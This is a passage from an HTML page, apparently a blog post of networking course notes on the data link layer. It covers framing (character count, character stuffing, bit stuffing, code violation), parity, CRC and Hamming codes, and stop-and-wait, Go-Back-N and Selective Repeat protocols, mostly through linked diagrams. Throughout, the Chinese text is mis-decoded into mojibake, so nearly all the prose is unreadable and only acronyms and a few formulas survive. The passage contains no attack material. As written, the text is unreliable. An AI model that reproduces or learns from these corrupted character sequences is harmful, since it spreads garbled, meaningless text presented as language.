·æ—¶ï¼Œå°±å¿…é¡»é‡‡å–é€‚å½“çš„æªæ–½ï¼Œä½¿æ”¶æ–¹ä¸ä¼šå°†è¿™æ ·çš„æ•°æ®è¯¯è®¤ä¸ºæ˜¯æŸç§æ§åˆ¶ä¿¡æ¯ã€‚è¿™æ ·æ‰èƒ½ä¿è¯æ•°æ®é“¾è·¯å±‚çš„ä¼ è¾“æ˜¯é€æ˜çš„ã€‚</p><h2 id="å››ç§ç»„å¸§æ–¹æ³•"><a href="#å››ç§ç»„å¸§æ–¹æ³•" class="headerlink" title="å››ç§ç»„å¸§æ–¹æ³•"></a>å››ç§ç»„å¸§æ–¹æ³•</h2><h3 id="å­—ç¬¦è®¡æ•°æ³•"><a href="#å­—ç¬¦è®¡æ•°æ³•" class="headerlink" title="å­—ç¬¦è®¡æ•°æ³•"></a>å­—ç¬¦è®¡æ•°æ³•</h3><p>å¸§é¦–éƒ¨ä½¿ç”¨ä¸€ä¸ªè®¡æ•°å­—æ®µ(ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå…«ä½)æ¥æ ‡æ˜å¸§å†…å­—ç¬¦æ•°</p><p><img src="http://cdn.clown2024.cn/202407151539734.png" alt="image-20240319004252864"></p><p>ä½†æ˜¯è¿™æ ·ä¸‡ä¸€å…¶ä¸­ä¸€ä¸ªå­—ç¬¦æ•°é”™äº†ï¼Œä¼šå¯¼è‡´åé¢æ‰€æœ‰éƒ½å‡ºç°é”™è¯¯ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•ä¸å¸¸ç”¨ã€‚</p><h3 id="å­—ç¬¦å¡«å……æ³•"><a href="#å­—ç¬¦å¡«å……æ³•" class="headerlink" title="å­—ç¬¦å¡«å……æ³•"></a>å­—ç¬¦å¡«å……æ³•</h3><p><img src="http://cdn.clown2024.cn/202407151539735.png" alt="image-20240319004625498"></p><p>å¦‚ä¸Šå›¾åœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½ä¼šé‡åˆ°åœ¨æ•°æ®éƒ¨åˆ†æœ‰æ§åˆ¶å­—ç¬¦å¯¼è‡´æ¥æ”¶æ–¹é”™è¯¯åˆ¤æ–­å¸§è¾¹ç•Œï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸‹é¢çš„å­—ç¬¦å¡«å……æ³•ï¼Œæœ‰ç‚¹ç±»ä¼¼ç¼–ç¨‹è¯­è¨€ä¸­çš„è½¬ä¹‰å­—ç¬¦ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539736.png" alt="image-20240319004800029"></p><p>å‘é€æ—¶åœ¨æ§åˆ¶å­—ç¬¦å‰æ·»åŠ è½¬ä¹‰å­—ç¬¦ESCï¼Œæ¥æ”¶æ—¶å°±æŠŠæ‰€æœ‰è½¬ä¹‰å­—ç¬¦å»æ‰</p><h3 id="é›¶æ¯”ç‰¹å¡«å……æ³•"><a href="#é›¶æ¯”ç‰¹å¡«å……æ³•" class="headerlink" title="é›¶æ¯”ç‰¹å¡«å……æ³•"></a>é›¶æ¯”ç‰¹å¡«å……æ³•</h3><p><img src="http://cdn.clown2024.cn/202407151539737.png" alt="image-20240319005002833"></p><h3 id="è¿è§„ç¼–ç æ³•"><a href="#è¿è§„ç¼–ç æ³•" class="headerlink" title="è¿è§„ç¼–ç æ³•"></a>è¿è§„ç¼–ç æ³•</h3><p><img src="http://cdn.clown2024.cn/202407151539738.png" alt="image-20240319005216244"></p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨ç‰©ç†å±‚çš„æ›¼å½»æ–¯ç‰¹ç¼–ç ä¸­çš„ç å…ƒè¦ä¸å°±é«˜-ä½æˆ–è€…ä½-é«˜ï¼Œé«˜-é«˜å’Œä½-ä½æ˜¯ä¸å¯èƒ½å‡ºç°çš„ï¼Œæ‰€ä»¥è¿™ä¸¤ç§å°±æ˜¯è¿è§„çš„ç¼–ç ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨æ¥ç•Œå®šå¸§çš„èµ·å§‹å’Œç»ˆæ­¢è€Œä¸ä¼šé‡å¤ï¼Œéå¸¸çš„ç¨³å¦¥ã€‚</p><blockquote><p>ç”±äºå­—èŠ‚è®¡æ•°æ³•ä¸­Countå­—æ®µçš„è„†å¼±æ€§(å…¶å€¼è‹¥æœ‰å·®é”™å°†å¯¼è‡´ç¾éš¾æ€§åæœ)åŠå­—ç¬¦å¡«å……å®ç°ä¸Šçš„å¤æ‚æ€§å’Œä¸å…¼å®¹æ€§ï¼Œç›®å‰è¾ƒæ™®éä½¿ç”¨çš„å¸§åŒæ­¥æ³•æ˜¯æ¯”ç‰¹å¡«å……å’Œè¿è§„ç¼–ç æ³•ã€‚</p></blockquote><h1 id="å·®é”™æ§åˆ¶"><a href="#å·®é”™æ§åˆ¶" class="headerlink" title="å·®é”™æ§åˆ¶"></a>å·®é”™æ§åˆ¶</h1><h2 id="å·®é”™æ§åˆ¶ä»‹ç»"><a href="#å·®é”™æ§åˆ¶ä»‹ç»" class="headerlink" title="å·®é”™æ§åˆ¶ä»‹ç»"></a>å·®é”™æ§åˆ¶ä»‹ç»</h2><p>æ¦‚æ‹¬æ¥è¯´ï¼Œä¼ è¾“ä¸­çš„å·®é”™ä¸»è¦æ˜¯ç”±äºå™ªå£°å¼•èµ·çš„</p><p><img src="http://cdn.clown2024.cn/202407151539739.png" alt="image-20240319092243604"></p><p><img src="http://cdn.clown2024.cn/202407151539740.png" alt="image-20240319092442403"></p><h2 id="æ£€é”™ç¼–ç "><a href="#æ£€é”™ç¼–ç " class="headerlink" title="æ£€é”™ç¼–ç "></a>æ£€é”™ç¼–ç </h2><p><strong>å¥‡å¶æ ¡éªŒç </strong></p><ol><li>å¥‡æ ¡éªŒç å°±æ˜¯æ¯”ç‰¹ä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°</li><li>å¶æ ¡éªŒç å°±æ˜¯æ¯”ç‰¹ä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°</li></ol><blockquote><p>ä½†æ˜¯è¿™ç§æ ¡éªŒæ–¹å¼å¦‚æœå‡ºç°å¶æ•°ä¸ªæ¯”ç‰¹å‡ºé”™å°±æ ¡éªŒä¸å‡ºæ¥äº†ï¼Œå› ä¸ºä¼šå’ŒåŸæ¯”ç‰¹æµçš„å¥‡å¶æ€§ä¸€è‡´ã€‚</p></blockquote><p><strong>CRCå¾ªç¯å†—ä½™ç </strong></p><p>è¿™é‡Œæœ‰ç‚¹ç±»ä¼¼äºç”¨é™¤æ³•å’Œä½™æ•°çš„å…³ç³»æ¥æ£€æµ‹æ•°æ®ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„é™¤æ³•æ¥è§£é‡Šcrcå†—ä½™ç çš„åŸç†</p><p><img src="http://cdn.clown2024.cn/202407151539741.png" alt="image-20240319181343240"></p><p>æ¯”å¦‚æœ‰ä¸€ä¸ª1101çš„é™¤æ•°ï¼Œé‚£ä»–çš„ç”Ÿæˆå¤šé¡¹å¼å°±æ˜¯ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151539742.png" alt="image-20240319181544775"></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªè®¡ç®—FCSçš„ä¾‹å­ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151539743.png" alt="image-20240319181821496"></p><blockquote><p>FCSçš„ç”Ÿæˆä»¥åŠæ¥æ”¶ç«¯CRCæ£€éªŒéƒ½æ˜¯ç”±ç¡¬ä»¶å®ç°ï¼Œå¤„ç†å¾ˆè¿…é€Ÿå› æ­¤ä¸ä¼šå»¶è¯¯æ•°æ®çš„ä¼ è¾“</p></blockquote><p>é“¾è·¯å±‚ä½¿ç”¨CRCæ£€éªŒï¼Œèƒ½å¤Ÿå®ç°æ— æ¯”ç‰¹å·®é”™çš„ä¼ è¾“ï¼Œä½†è¿™è¿˜ä¸æ˜¯å¯é ä¼ è¾“ï¼Œå› ä¸ºæœ‰äº›å¸§è¢«ä¸¢å¼ƒäº†ã€‚</p><h2 id="çº é”™ç¼–ç "><a href="#çº é”™ç¼–ç " class="headerlink" title="çº é”™ç¼–ç "></a>çº é”™ç¼–ç </h2><p>æµ·æ˜ç å¯ä»¥å‘ç°é”™è¯¯å¹¶æ‰¾åˆ°ä½ç½®ï¼Œæœ€åçº æ­£é”™è¯¯</p><p><strong>å·¥ä½œæµç¨‹</strong></p><p><img src="http://cdn.clown2024.cn/202407151539744.png" alt="image-20240319094010233"></p><p><strong>æµ·æ˜è·ç¦»(ç è·)</strong></p><p>ä¸¤ä¸ªåˆæ³•ç¼–ç (ç å­—)çš„å¯¹åº”æ¯”ç‰¹å–å€¼ä¸åŒçš„æ¯”ç‰¹æ•°ç§°ä¸ºè¿™ä¸¤ä¸ªç å­—çš„æµ·æ˜è·ç¦»(ç è·)ï¼Œä¸€ä¸ªæœ‰æ•ˆç¼–ç é›†ä¸­,ä»»æ„ä¸¤ä¸ªåˆæ³•ç¼–ç (ç å­—)çš„æµ·æ˜è·ç¦»çš„æœ€å°å€¼ç§°ä¸ºè¯¥ç¼–ç é›†çš„æµ·æ˜è·ç¦»(ç è·)ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539745.png" alt="image-20240319174734678"></p><p>æ¯”å¦‚å·¦è¾¹ç¬¬ä¸€ä¸ª000å’Œ001æœ‰ä¸€ä¸ªæ¯”ç‰¹ä½ä¸ä¸€æ ·åŒæ—¶ä¹Ÿæ˜¯æœ€å°çš„ï¼Œæ‰€ä»¥ç è·ä¸º1ï¼ŒåŒç†å³è¾¹è¿™ä¸ªä¸º2ï¼›</p><p>æ‰€ä»¥å½“ç è·ä¸ºdæ—¶ï¼Œè¦æ£€æŸ¥å‡ºé”™è¯¯çš„è¯å°±åªèƒ½æ£€æµ‹å‡ºd-1ä½ï¼Œå› ä¸ºå¦‚æœæœ‰dä½å‡ºé”™çš„è¯å¯èƒ½å˜æˆä¸€ä¸ªæ­£ç¡®çš„ç¼–ç ï¼Œè¿™æ ·å°±æ— æ³•åˆ¤æ–­äº†ã€‚</p><p>è€Œæƒ³è¦çº é”™dä½çš„è¯å°±è¦2d+1ç è·äº†ã€‚</p><h3 id="ç¡®å®šæ ¡éªŒç ä½æ•°r"><a href="#ç¡®å®šæ ¡éªŒç ä½æ•°r" class="headerlink" title="ç¡®å®šæ ¡éªŒç ä½æ•°r"></a>ç¡®å®šæ ¡éªŒç ä½æ•°r</h3><p><img src="http://cdn.clown2024.cn/202407151539746.png" alt="image-20240319182311727"></p><h3 id="ç¡®å®šæ ¡éªŒç å’Œæ•°æ®çš„ä½ç½®"><a href="#ç¡®å®šæ ¡éªŒç å’Œæ•°æ®çš„ä½ç½®" class="headerlink" title="ç¡®å®šæ ¡éªŒç å’Œæ•°æ®çš„ä½ç½®"></a>ç¡®å®šæ ¡éªŒç å’Œæ•°æ®çš„ä½ç½®</h3><p><img src="http://cdn.clown2024.cn/202407151539747.png" alt="image-20240319182425486"></p><h3 id="æ±‚å‡ºæ ¡éªŒç çš„å€¼"><a href="#æ±‚å‡ºæ ¡éªŒç çš„å€¼" class="headerlink" title="æ±‚å‡ºæ ¡éªŒç çš„å€¼"></a>æ±‚å‡ºæ ¡éªŒç çš„å€¼</h3><p><img src="http://cdn.clown2024.cn/202407151539748.png" alt="image-20240319182555883"></p><h3 id="æ£€é”™å¹¶çº é”™"><a href="#æ£€é”™å¹¶çº é”™" class="headerlink" title="æ£€é”™å¹¶çº é”™"></a>æ£€é”™å¹¶çº é”™</h3><p><img src="http://cdn.clown2024.cn/202407151539749.png" alt="image-20240319182901466"></p><p><strong>çº é”™æ–¹æ³•ä¸€</strong></p><p><img src="http://cdn.clown2024.cn/202407151539750.png" alt="image-20240319182927374"></p><p><strong>çº é”™æ–¹æ³•äºŒ</strong></p><p><img src="http://cdn.clown2024.cn/202407151539751.png" alt="image-20240319182949728"></p><h1 id="æµé‡æ§åˆ¶ä¸å¯é ä¼ è¾“æœºåˆ¶"><a href="#æµé‡æ§åˆ¶ä¸å¯é ä¼ è¾“æœºåˆ¶" class="headerlink" title="æµé‡æ§åˆ¶ä¸å¯é ä¼ è¾“æœºåˆ¶"></a>æµé‡æ§åˆ¶ä¸å¯é ä¼ è¾“æœºåˆ¶</h1><p>è¾ƒé«˜çš„å‘é€é€Ÿåº¦å’Œè¾ƒä½çš„æ¥æ”¶èƒ½åŠ›çš„ä¸åŒ¹é…ï¼Œä¼šé€ æˆä¼ è¾“å‡ºé”™ï¼Œå› æ­¤æµé‡æ§åˆ¶ä¹Ÿæ˜¯æ•°æ®é“¾è·¯å±‚çš„ä¸€é¡¹é‡è¦å·¥ä½œã€‚</p><p><strong>ä¼ è¾“å±‚å’Œé“¾è·¯å±‚æµé‡æ§åˆ¶çš„åŒºåˆ«</strong></p><p>æ•°æ®é“¾è·¯å±‚æ—¶ç‚¹å¯¹ç‚¹çš„(æŒ‡ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹)ï¼Œä¼ è¾“å±‚æ˜¯ç«¯åˆ°ç«¯çš„(æŒ‡ä¸¤ä¸ªä¸»æœºä¹‹é—´)</p><p>æ•°æ®é“¾è·¯å±‚æµé‡æ§åˆ¶æ‰‹æ®µ:æ¥æ”¶æ–¹æ”¶ä¸ä¸‹å°±ä¸å›å¤ç¡®è®¤ã€‚</p><p>ä¼ è¾“å±‚æµé‡æ§åˆ¶æ‰‹æ®µ:æ¥æ”¶ç«¯ç»™å‘é€ç«¯ä¸€ä¸ªçª—å£å…¬å‘Šã€‚</p><p><strong>æµé‡æ§åˆ¶çš„æ–¹æ³•</strong></p><p><img src="http://cdn.clown2024.cn/202407151539752.png" alt="image-20240320004554062"></p><p>æ‰€è°“çš„æ»‘åŠ¨çª—å£å°±æ˜¯æ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®å¾€åç§»åŠ¨ä¸€å¸§ï¼Œå‘é€æ–¹æ”¶åˆ°ç¡®è®¤å°±å¾€åç§»åŠ¨ä¸€å¸§ï¼›</p><p>åœæ­¢-ç­‰å¾…åè®®ä¹Ÿå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªçª—å£ä¸º1çš„ç‰¹æ®Šçš„æ»‘åŠ¨çª—å£åè®®</p><p><img src="http://cdn.clown2024.cn/202407151539753.png" alt="image-20240320004750636"></p><p>æ•°æ®é“¾è·¯å±‚çš„æ»‘åŠ¨çª—å£åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­éƒ½æ˜¯ç¡®å®šçš„ï¼Œè€Œä¼ è¾“å±‚åˆ™ä¸ä¸€å®š</p><p><strong>å¯é ä¼ è¾“ã€æ»‘åŠ¨çª—å£ã€æµé‡æ§åˆ¶</strong></p><p>å¯é ä¼ è¾“ï¼šå‘é€ç«¯å‘å•¥ï¼Œæ¥æ”¶ç«¯æ”¶å•¥</p><p>æµé‡æ§åˆ¶ï¼šæ§åˆ¶å‘é€é€Ÿç‡ï¼Œä½¿æ¥æ”¶æ–¹æœ‰è¶³å¤Ÿçš„ç¼“å†²ç©ºé—´æ¥æ¥æ”¶æ¯ä¸€ä¸ªå¸§ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539754.png" alt="image-20240320005114497"></p><h2 id="åœæ­¢ç­‰å¾…åè®®"><a href="#åœæ­¢ç­‰å¾…åè®®" class="headerlink" title="åœæ­¢ç­‰å¾…åè®®"></a>åœæ­¢ç­‰å¾…åè®®</h2><p><strong>åœæ­¢ç­‰å¾…åè®®çš„ç›®çš„</strong></p><p>é™¤äº†æ¯”ç‰¹å‡ºå·®é”™ï¼Œåº•å±‚ä¿¡é“è¿˜ä¼šå‡ºç°ä¸¢åŒ…é—®é¢˜ã€‚ä¸ºäº†å®ç°æµé‡æ§åˆ¶ã€‚</p><p><strong>å‰æ</strong></p><p>â€œåœæ­¢-ç­‰å¾…â€å°±æ˜¯æ¯å‘é€å®Œä¸€ä¸ªåˆ†ç»„å°±åœæ­¢å‘é€ï¼Œç­‰å¾…å¯¹æ–¹ç¡®è®¤ï¼Œåœ¨æ”¶åˆ°ç¡®è®¤åå†å‘é€ä¸‹ä¸€ä¸ªåˆ†ç»„ã€‚</p><p><strong>åº”ç”¨æƒ…å†µåˆ†ä¸ºä¸¤ç§</strong></p><p>æ— å·®é”™æƒ…å†µ&amp;æœ‰å·®é”™æƒ…å†µ</p><h3 id="æ— å·®é”™æƒ…å†µ"><a href="#æ— å·®é”™æƒ…å†µ" class="headerlink" title="æ— å·®é”™æƒ…å†µ"></a>æ— å·®é”™æƒ…å†µ</h3><p><img src="http://cdn.clown2024.cn/202407151539755.png" alt="image-20240321081756032"></p><p>0å·å¸§åªæ˜¯ç¼–å·ä¸€æ ·ï¼Œä¸¤ä¸ªå¸§æ˜¯ä¸ä¸€æ ·çš„</p><h3 id="æœ‰å·®é”™æƒ…å†µ"><a href="#æœ‰å·®é”™æƒ…å†µ" class="headerlink" title="æœ‰å·®é”™æƒ…å†µ"></a>æœ‰å·®é”™æƒ…å†µ</h3><p><img src="http://cdn.clown2024.cn/202407151539756.png" alt="image-20240321082020356"></p><ol><li><p>å‘å®Œä¸€ä¸ªå¸§åï¼Œå¿…é¡»ä¿ç•™å®ƒçš„å‰¯æœ¬ã€‚</p></li><li><p>æ•°æ®å¸§å’Œç¡®è®¤å¸§å¿…é¡»ç¼–å·ã€‚</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151539757.png" alt="image-20240321082242961"></p><p><img src="http://cdn.clown2024.cn/202407151539758.png" alt="image-20240321082347053"></p><p>æ­¤æ—¶è‹¥åœ¨æ”¶åˆ°é‡ä¼ ç¡®è®¤0å·å¸§ä¹‹å‰æ”¶åˆ°äº†ä¹‹å‰è¿Ÿåˆ°çš„ç¡®è®¤0å·å¸§ï¼Œåœ¨æ”¶åˆ°é‡ä¼ ç¡®è®¤å¸§ä¹‹åä¹Ÿä¼šå°†å…¶ä¸¢å¼ƒã€‚</p><h3 id="ä¿¡é“åˆ©ç”¨ç‡"><a href="#ä¿¡é“åˆ©ç”¨ç‡" class="headerlink" title="ä¿¡é“åˆ©ç”¨ç‡"></a>ä¿¡é“åˆ©ç”¨ç‡</h3><p><strong>å®šä¹‰</strong></p><p>å‘é€æ–¹åœ¨ä¸€ä¸ªå‘é€å‘¨æœŸå†…ï¼Œæœ‰æ•ˆåœ°å‘é€æ•°æ®æ‰€éœ€è¦çš„æ—¶é—´å æ•´ä¸ªå‘é€å‘¨æœŸçš„æ¯”ç‡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539759.png" alt="image-20240321082926486"></p><p><img src="http://cdn.clown2024.cn/202407151539760.png" alt="image-20240321082757357"></p><p><strong>ä¾‹é¢˜</strong></p><p><img src="http://cdn.clown2024.cn/202407151539761.png" alt="image-20240321083051546"></p><h2 id="åé€€nå¸§åè®®gbnåè®®"><a href="#åé€€Nå¸§åè®®-GBNåè®®" class="headerlink" title="åé€€Nå¸§åè®®(GBNåè®®)"></a>åé€€Nå¸§åè®®(GBNåè®®)</h2><p><strong>åé€€Nå¸§åè®®ä¸­çš„æ»‘åŠ¨çª—å£</strong></p><p><img src="http://cdn.clown2024.cn/202407151539762.png" alt="image-20240328005017907"></p><p>è¿™é‡Œçš„æ¥æ”¶çª—å£ä¸ºä¸€ï¼Œå‘é€çª—å£æœ‰å¤šä¸ª</p><p>å½“å‘é€çª—å£æˆ–è€…æ¥æ”¶çª—å£ç¡®è®¤å‘é€æˆ–è€…æ¥æ”¶ä¹‹åå°±ä¼šå‘ä¸‹æ»‘åŠ¨ã€‚</p><p>åé€€Nå¸§è¿˜æœ‰ä¸€ä¸ªä¸åŒäºåœæ­¢ç­‰å¾…çš„ç‰¹ç‚¹å°±æ˜¯ä»–å¯ä»¥ç´¯è®¡ç¡®è®¤ï¼Œå°±æ˜¯ä¸éœ€è¦æ¯ä¸€å¸§éƒ½å‘é€ç¡®è®¤ï¼Œæ¯”å¦‚åœ¨æ”¶åˆ°3å·å¸§çš„æ—¶å€™æ‰å‘é€ç¡®è®¤å¸§ä»£è¡¨å‰é¢éƒ½æ˜¯æ­£å¸¸æ¥æ”¶åˆ°çš„ã€‚</p><p><strong>GBNå‘é€æ–¹éœ€è¦å“åº”çš„ä¸‰ä»¶äº‹</strong></p><ol><li><p>ä¸Šå±‚çš„è°ƒç”¨</p><p>ä¸Šå±‚è¦å‘é€æ•°æ®æ—¶ï¼Œå‘é€æ–¹å…ˆæ£€æŸ¥å‘é€çª—å£æ˜¯å¦å·²æ»¡ï¼Œå¦‚æœæœªæ»¡ï¼Œåˆ™äº§ç”Ÿä¸€ä¸ªå¸§å¹¶å°†å…¶å‘é€ï¼›å¦‚æœçª—å£å·±æ»¡å‘é€æ–¹åªéœ€å°†æ•°æ®è¿”å›ç»™ä¸Šå±‚ï¼Œæš—ç¤ºä¸Šå±‚çª—å£å·±æ»¡ã€‚ä¸Šå±‚ç­‰ä¸€ä¼šå†å‘é€ã€‚(å®é™…å®ç°ä¸­ï¼Œå‘é€æ–¹å¯ä»¥ç¼“å­˜è¿™äº›æ•°æ®ï¼Œçª—å£ä¸æ»¡æ—¶å†å‘é€å¸§)ã€‚</p></li><li><p>æ”¶åˆ°äº†ä¸€ä¸ªACKç¡®è®¤å¸§</p><p>GBNåè®®ä¸­ï¼Œå¯¹nå·å¸§çš„ç¡®è®¤é‡‡ç”¨ç´¯ç§¯ç¡®è®¤çš„æ–¹å¼ï¼Œæ ‡æ˜æ¥æ”¶æ–¹å·²ç»æ”¶åˆ°nå·å¸§å’Œå®ƒä¹‹å‰çš„å…¨éƒ¨å¸§ã€‚</p></li><li><p>è¶…æ—¶äº‹ä»¶</p><p>åè®®çš„åå­—ä¸ºåé€€Nå¸§&#x2F;å›é€€Nå¸§ï¼Œæ¥æºäºå‡ºç°ä¸¢å¤±å’Œæ—¶å»¶è¿‡é•¿å¸§æ—¶å‘é€æ–¹çš„è¡Œä¸ºã€‚å°±åƒåœ¨åœç­‰åè®®ä¸­ä¸€æ ·å®šæ—¶å™¨å°†å†æ¬¡ç”¨äºæ¢å¤æ•°æ®å¸§æˆ–ç¡®è®¤å¸§çš„ä¸¢å¤±ã€‚å¦‚æœå‡ºç°è¶…æ—¶ï¼Œå‘é€æ–¹é‡ä¼ æ‰€æœ‰å·²å·±å‘é€ä½†æœªè¢«ç¡®è®¤çš„å¸§ã€‚</p><blockquote><p>æ¯”å¦‚å‘é€æ–¹å‘é€äº†ä¸€ä¸ª1å·å¸§ä½†æ˜¯ä¸¢å¤±äº†ï¼Œåç»­ç»§ç»­å‘é€2ã€3ã€4å·å¸§ï¼Œä½†æ˜¯æ¥æ”¶æ–¹æ¥æ”¶åˆ°0å·å¸§ä¹‹åä¼šç­‰å¾…æ¥æ”¶1å·å¸§ï¼Œä½†æ˜¯æ¥çš„æ˜¯é1å·å¸§ä»–å°±ä¼šä¸¢å¼ƒï¼›æ‰€ä»¥å¯¼è‡´åŒæ–¹éƒ½åœ¨ç­‰å¾…ï¼Œè¶…è¿‡ä¸€æ®µæ—¶é—´åå‘é€æ–¹å°±ä¼šé‡ä¼ ä¹‹å‰1å·å¸§åŒ…æ‹¬1å·å¸§å‘é€ä¹‹åçš„æ•°æ®ã€‚</p></blockquote></li></ol><p><strong>GBNæ¥æ”¶æ–¹éœ€è¦åšçš„äº‹</strong></p><p> <img src="http://cdn.clown2024.cn/202407151539763.png" alt="image-20240328152503951"></p><p><strong>æ•´ä¸ªGBNåè®®çš„æµç¨‹å›¾</strong></p><p><img src="http://cdn.clown2024.cn/202407151539764.png" alt="image-20240328152727575"></p><p><strong>æ»‘åŠ¨çª—å£çš„é•¿åº¦</strong></p><p>è‹¥é‡‡ç”¨næ¯”ç‰¹å¯¹å¸§ç¼–å·ï¼Œé‚£ä¹ˆå‘é€çª—å£çš„å°ºå¯¸Wï¼Œåº”æ»¡è¶³:1â‰¤ Wâ‰¤2^n-1ã€‚å› ä¸ºå‘é€çª—å£å°ºå¯¸è¿‡å¤§ï¼Œå°±ä¼šä½¿å¾—æ¥æ”¶æ–¹æ— æ³•åŒºåˆ«æ–°å¸§å’Œæ—§å¸§ã€‚</p><h2 id="é€‰æ‹©é‡ä¼ åè®®sr"><a href="#é€‰æ‹©é‡ä¼ åè®®-SR" class="headerlink" title="é€‰æ‹©é‡ä¼ åè®®(SR)"></a>é€‰æ‹©é‡ä¼ åè®®(SR)</h2><p><strong>GBNåè®®çš„å¼Šç«¯</strong></p><p>ç”±äºç´¯è®¡ç¡®è®¤çš„åŸå› ï¼Œå·²å‘é€è¿‡çš„å¸§ä¹Ÿè¦é‡ä¼ å°±æµªè´¹äº†å¾ˆå¤šèµ„æºã€‚</p><p><strong>è§£å†³åŠæ³•ï¼š</strong>è®¾ç½®å•ä¸ªç¡®è®¤ï¼ŒåŒæ—¶åŠ å¤§æ¥æ”¶çª—å£ï¼Œè®¾ç½®æ¥æ”¶ç¼“å­˜ï¼Œç¼“å­˜ä¹±åºåˆ°è¾¾çš„å¸§ã€‚</p><p><strong>è¿™æ˜¯ä¸¤ä¸ªæœ‰å…³SRçš„æ»‘åŠ¨çª—å£ä¾‹å­</strong></p><p><img src="http://cdn.clown2024.cn/202407151539765.png" alt="image-20240331155314314"></p><h3 id="srå‘é€æ–¹è¦åšçš„äº‹"><a href="#SRå‘é€æ–¹è¦åšçš„äº‹" class="headerlink" title="SRå‘é€æ–¹è¦åšçš„äº‹"></a>SRå‘é€æ–¹è¦åšçš„äº‹</h3><ol><li><p>ä¸Šå±‚çš„è°ƒç”¨<br>ä»ä¸Šå±‚æ”¶åˆ°æ•°æ®åï¼ŒSRå‘é€æ–¹æ£€æŸ¥ä¸‹ä¸€ä¸ªå¯ç”¨äºè¯¥å¸§çš„åºå·ï¼Œå¦‚æœåºå·ä½äºå‘é€çª—å£å†…ï¼Œåˆ™å‘é€æ•°æ®å¸§;å¦åˆ™å°±åƒGBNä¸€æ ·ï¼Œè¦ä¹ˆå°†æ•°æ®ç¼“å­˜ï¼Œè¦ä¹ˆè¿”å›ç»™ä¸Šå±‚ä¹‹åå†ä¼ è¾“ã€‚</p></li><li><p>æ”¶åˆ°äº†ä¸€ä¸ªACK<br>å¦‚æœæ”¶åˆ°ACKï¼ŒåŠ å…¥è¯¥å¸§åºå·åœ¨çª—å£å†…ï¼Œåˆ™SRå‘é€æ–¹å°†é‚£ä¸ªè¢«ç¡®è®¤çš„å¸§æ ‡è®°ä¸ºå·²æ¥æ”¶ã€‚å¦‚æœè¯¥å¸§åºå·æ˜¯çª—å£çš„ä¸‹ç•Œ(æœ€å·¦è¾¹ç¬¬ä¸€ä¸ªçª—å£å¯¹åº”çš„åºå·)ï¼Œåˆ™çª—å£å‘å‰ç§»åŠ¨åˆ°å…·æœ‰æœ€å°åºå·çš„æœªç¡®è®¤å¸§å¤„ã€‚å¦‚æœçª—å£ç§»åŠ¨äº†å¹¶ä¸”æœ‰åºå·åœ¨çª—å£å†…çš„æœªå‘é€å¸§ï¼Œåˆ™å‘é€è¿™äº›å¸§ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539766.png" alt="image-20240331155626452"></p></li><li><p>è¶…æ—¶äº‹ä»¶<br>æ¯ä¸ªå¸§éƒ½æœ‰è‡ªå·±çš„å®šæ—¶å™¨ï¼Œä¸€ä¸ªè¶…æ—¶äº‹ä»¶å‘ç”Ÿååªé‡ä¼ ä¸€ä¸ªå¸§ã€‚</p></li></ol><h3 id="sræ¥æ”¶æ–¹è¦åšçš„äº‹"><a href="#SRæ¥æ”¶æ–¹è¦åšçš„äº‹" class="headerlink" title="SRæ¥æ”¶æ–¹è¦åšçš„äº‹"></a>SRæ¥æ”¶æ–¹è¦åšçš„äº‹</h3><p>SRæ¥æ”¶æ–¹å°†ç¡®è®¤ä¸€ä¸ªæ­£ç¡®æ¥æ”¶çš„å¸§è€Œä¸ç®¡å…¶æ˜¯å¦æŒ‰åºã€‚å¤±åºçš„å¸§å°†è¢«ç¼“å­˜ï¼Œå¹¶è¿”å›ç»™å‘é€æ–¹ä¸€ä¸ªè¯¥å¸§çš„ç¡®è®¤å¸§ã€æ”¶è°ç¡®è®¤è°ã€‘ï¼Œç›´åˆ°æ‰€æœ‰(å³åºå·æ›´å°çš„å¸§)çš†è¢«æ”¶åˆ°ä¸ºæ­¢ï¼Œè¿™æ—¶æ‰å¯ä»¥å°†ä¸€æ‰¹å¸§æŒ‰åºäº¤ä»˜ç»™ä¸Šå±‚ï¼Œç„¶åå‘å‰ç§»åŠ¨æ»‘åŠ¨çª—å£ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539767.png" alt="image-20240331155942903"></p><p>å¦‚æœæ”¶åˆ°äº†çª—å£åºå·ä¹‹å¤–çš„å¸§ï¼Œå°±è¿”å›ä¸€ä¸ªACKï¼Œä¸è¿‡è¿™ä¸ªå¸§æ˜¯è¦å°äºä¸‹ç•Œçš„å¸§ï¼Œå› ä¸ºå‰é¢çš„å¸§éƒ½æ˜¯å·²ç»æ¥æ”¶è¿‡çš„ï¼Œå¯èƒ½åœ¨å‘é€ACKç¡®è®¤å¸§çš„æ—¶å€™ä¸¢å¤±äº†ï¼Œå¯¼è‡´è§¦å‘äº†è¶…æ—¶é‡ä¼ ã€‚</p><h3 id="è¿è¡Œä¸­çš„srçš„æµç¨‹å›¾"><a href="#è¿è¡Œä¸­çš„SRçš„æµç¨‹å›¾" class="headerlink" title="è¿è¡Œä¸­çš„SRçš„æµç¨‹å›¾"></a>è¿è¡Œä¸­çš„SRçš„æµç¨‹å›¾</h3><p><img src="http://cdn.clown2024.cn/202407151539768.png" alt="image-20240331160353171"></p><p> 